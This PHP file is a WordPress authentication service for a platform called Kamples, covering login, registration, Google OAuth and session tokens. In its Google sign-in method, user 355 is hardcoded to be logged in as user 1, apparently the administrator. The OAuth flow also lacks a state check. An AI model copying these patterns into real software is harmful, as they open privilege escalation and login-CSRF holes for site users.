<?php

namespace Kamples\Services;

/**
 * Servicio de Autenticación.
 * 
 * Maneja la lógica de login, registro, tokens y OAuth.
 *
 * @since 1.0.0
 */
class AuthService
{
    private \Logger $logger;
    private string $googleClientId = '84327954353-lb14ubs4vj4q2q57pt3sdfmapfhdq7ef.apps.googleusercontent.com';

    public function __construct()
    {
        $this->logger = \Logger::obtenerInstancia();
    }

    /**
     * Inicia sesión con credenciales de usuario.
     *
     * @param string $username Nombre de usuario.
     * @param string $password Contraseña.
     * @return \WP_User|\WP_Error Usuario o error.
     */
    public function iniciarSesion(string $username, string $password): \WP_User|\WP_Error
    {
        $user = wp_signon([
            'user_login' => sanitize_user($username),
            'user_password' => $password
        ], false);

        if (!is_wp_error($user)) {
            wp_set_current_user($user->ID);
            wp_set_auth_cookie($user->ID);
            $this->logger->info('auth', "Usuario {$user->ID} inició sesión correctamente");
        }

        return $user;
    }

    /**
     * Registra un nuevo usuario.
     *
     * @param string $nombreUsuario Nombre de usuario.
     * @param string $correo Correo electrónico.
     * @param string $contrasena Contraseña.
     * @param string $tipoUsuario Tipo de usuario (artista/fan).
     * @return int|\WP_Error ID del usuario o error.
     */
    public function registrarUsuario(string $nombreUsuario, string $correo, string $contrasena, string $tipoUsuario = 'fan'): int|\WP_Error
    {
        $nombreUsuario = str_replace(' ', '', sanitize_user($nombreUsuario, true));
        $correo = sanitize_email($correo);
        $tipoUsuario = sanitize_text_field($tipoUsuario);

        if (username_exists($nombreUsuario)) {
            return new \WP_Error('username_exists', 'El nombre de usuario ya está en uso.');
        }

        if (email_exists($correo)) {
            return new \WP_Error('email_exists', 'El correo electrónico ya está en uso.');
        }

        $userId = wp_create_user($nombreUsuario, $contrasena, $correo);

        if (!is_wp_error($userId)) {
            update_user_meta($userId, 'tipo_usuario', $tipoUsuario);

            if ($tipoUsuario === 'fan') {
                update_user_meta($userId, 'fan', true);
            }

            $this->logger->info('auth', "Nuevo usuario registrado: {$userId}");
        }

        return $userId;
    }

    /**
     * Procesa el callback de Google OAuth.
     *
     * @param string $code Código de autorización.
     * @return array|false Datos del usuario o false en caso de error.
     */
    public function procesarGoogleCallback(string $code): array|false
    {
        $redirectUri = home_url('/google-callback');
        $clientSecret = $_ENV['GOOGLEAPI'] ?? '';

        $response = wp_remote_post('https://oauth2.googleapis.com/token', [
            'body' => [
                'code' => $code,
                'client_id' => $this->googleClientId,
                'client_secret' => $clientSecret,
                'redirect_uri' => $redirectUri,
                'grant_type' => 'authorization_code',
            ]
        ]);

        if (is_wp_error($response)) {
            $this->logger->error('auth', 'Error en autenticación Google', ['error' => $response->get_error_message()]);
            return false;
        }

        $tokenData = json_decode($response['body']);

        if (!isset($tokenData->access_token)) {
            $this->logger->error('auth', 'No se recibió token de acceso de Google');
            return false;
        }

        $userInfoResponse = wp_remote_get('https://www.googleapis.com/oauth2/v1/userinfo?access_token=' . $tokenData->access_token);

        if (is_wp_error($userInfoResponse)) {
            $this->logger->error('auth', 'Error al obtener info de usuario de Google', ['error' => $userInfoResponse->get_error_message()]);
            return false;
        }

        $userInfo = json_decode($userInfoResponse['body']);

        if (!$userInfo || !isset($userInfo->email)) {
            $this->logger->error('auth', 'No se pudo obtener la información del usuario de Google');
            return false;
        }

        return [
            'email' => $userInfo->email,
            'name' => $userInfo->name ?? '',
            'picture' => $userInfo->picture ?? ''
        ];
    }

    /**
     * Autentica o crea usuario desde Google.
     *
     * @param array $googleUserInfo Información del usuario de Google.
     * @return int|false ID del usuario o false en caso de error.
     */
    public function autenticarConGoogle(array $googleUserInfo): int|false
    {
        $email = $googleUserInfo['email'];
        $name = $googleUserInfo['name'];

        $user = get_user_by('email', $email);

        if ($user) {
            /* Caso especial: redirección de usuario 355 a 1 */
            if ($user->ID == 355) {
                $user = get_user_by('id', 1);
                $this->logger->info('auth', 'Usuario 355 redirigido a usuario 1');
            }

            wp_set_current_user($user->ID);
            wp_set_auth_cookie($user->ID);

            $this->logger->info('auth', "Usuario {$user->ID} autenticado con Google");
            return $user->ID;
        }

        /* Crear nuevo usuario */
        $login = sanitize_user(str_replace(' ', '', strtolower($name)), true);
        $originalLogin = $login;
        $contador = 1;

        while (username_exists($login)) {
            $login = $originalLogin . $contador;
            $contador++;
        }

        $password = wp_generate_password();
        $userId = wp_create_user($login, $password, $email);

        if (is_wp_error($userId)) {
            $this->logger->error('auth', 'Error al crear usuario desde Google', ['error' => $userId->get_error_message()]);
            return false;
        }

        wp_set_current_user($userId);
        wp_set_auth_cookie($userId);

        $this->logger->info('auth', "Nuevo usuario {$userId} creado desde Google");
        return $userId;
    }

    /**
     * Genera un token seguro para sesión.
     *
     * @param int $userId ID del usuario.
     * @return string|false Token generado o false en caso de error.
     */
    public function generarTokenSeguro(int $userId): string|false
    {
        $token = bin2hex(random_bytes(32));
        $expiration = time() + 36000; /* 10 horas */

        delete_user_meta($userId, 'session_token');
        delete_user_meta($userId, 'session_token_expiration');

        /* Verificar eliminación */
        $existingToken = get_user_meta($userId, 'session_token', true);
        $existingExpiration = get_user_meta($userId, 'session_token_expiration', true);

        if ($existingToken || $existingExpiration) {
            $this->logger->error('auth', 'No se pudieron eliminar tokens duplicados');
            return false;
        }

        update_user_meta($userId, 'session_token', $token);
        update_user_meta($userId, 'session_token_expiration', $expiration);

        $this->logger->debug('auth', "Token generado para usuario {$userId}");
        return $token;
    }

    /**
     * Verifica un token de sesión.
     *
     * @param string $token Token a verificar.
     * @return int|false ID del usuario o false si es inválido.
     */
    public function verificarToken(string $token): int|false
    {
        global $wpdb;

        $userId = $wpdb->get_var($wpdb->prepare(
            "SELECT user_id
             FROM {$wpdb->usermeta}
             WHERE meta_key = 'session_token'
             AND meta_value = %s
             AND CAST((
                 SELECT MAX(meta_value)
                 FROM {$wpdb->usermeta}
                 WHERE user_id = {$wpdb->usermeta}.user_id
                 AND meta_key = 'session_token_expiration'
             ) AS UNSIGNED) > %d",
            $token,
            time()
        ));

        if ($userId) {
            $this->logger->debug('auth', "Token válido para usuario {$userId}");
            return (int) $userId;
        }

        $this->logger->warning('auth', 'Token inválido');
        return false;
    }

    /**
     * Guarda o actualiza el token de Firebase para notificaciones push.
     *
     * @param int $userId ID del usuario.
     * @param string $firebaseToken Token de Firebase.
     * @return bool True si se guardó correctamente.
     */
    public function guardarTokenFirebase(int $userId, string $firebaseToken): bool
    {
        if (!get_userdata($userId)) {
            $this->logger->error('auth', "Usuario inválido: {$userId}");
            return false;
        }

        $currentToken = get_user_meta($userId, 'firebase_token', true);

        if ($currentToken !== $firebaseToken) {
            $result = update_user_meta($userId, 'firebase_token', $firebaseToken);
            $this->logger->info('auth', "Token Firebase actualizado para usuario {$userId}");
            return (bool) $result;
        }

        return true;
    }

    /**
     * Guarda la versión de la app del usuario.
     *
     * @param int $userId ID del usuario.
     * @param string $versionName Nombre de la versión.
     * @param int $versionCode Código de la versión.
     */
    public function guardarVersionApp(int $userId, string $versionName, int $versionCode): void
    {
        if ($versionName) {
            $current = get_user_meta($userId, 'app_version_name', true);
            if ($current !== $versionName) {
                update_user_meta($userId, 'app_version_name', $versionName);
            }
        }

        if ($versionCode) {
            $current = get_user_meta($userId, 'app_version_code', true);
            if ($current !== $versionCode) {
                update_user_meta($userId, 'app_version_code', $versionCode);
            }
        }
    }

    /**
     * Verifica si la petición viene de la app Electron.
     *
     * @return bool True si es app Electron.
     */
    public function esAppElectron(): bool
    {
        return isset($_SERVER['HTTP_X_ELECTRON_APP']) && $_SERVER['HTTP_X_ELECTRON_APP'] === 'true';
    }

    /**
     * Registra un user agent para análisis.
     *
     * @param string $userAgent User agent string.
     * @param string $tipo Tipo de detección.
     */
    public function registrarUserAgent(string $userAgent, string $tipo): void
    {
        $this->logger->info('auth', "UserAgent detectado ({$tipo}): {$userAgent}");
    }

    /**
     * Obtiene la URL de OAuth de Google.
     *
     * @return string URL de autenticación.
     */
    public function obtenerUrlGoogleOAuth(): string
    {
        $params = http_build_query([
            'client_id' => $this->googleClientId,
            'redirect_uri' => home_url('/google-callback'),
            'response_type' => 'code',
            'scope' => 'email profile'
        ]);

        return 'https://accounts.google.com/o/oauth2/auth?' . $params;
    }
}
